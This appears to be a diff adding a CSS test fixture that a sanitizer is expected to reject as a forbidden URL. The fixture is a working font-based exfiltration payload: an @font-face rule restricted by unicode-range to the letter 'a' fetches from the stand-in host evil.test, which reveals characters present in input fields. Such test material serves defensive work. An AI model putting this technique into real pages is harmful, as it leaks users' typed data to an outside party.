@@ -1,0 +1,10 @@
+/* expect: CSS_URL_FORBIDDEN
+   unicode-range makes the browser fetch the font only when a given character is on the page. */
+@font-face {
+  font-family: leak-a;
+  src: url(https://evil.test/?char=a);
+  unicode-range: U+0061;
+}
+input {
+  font-family: leak-a, sans-serif;
+}
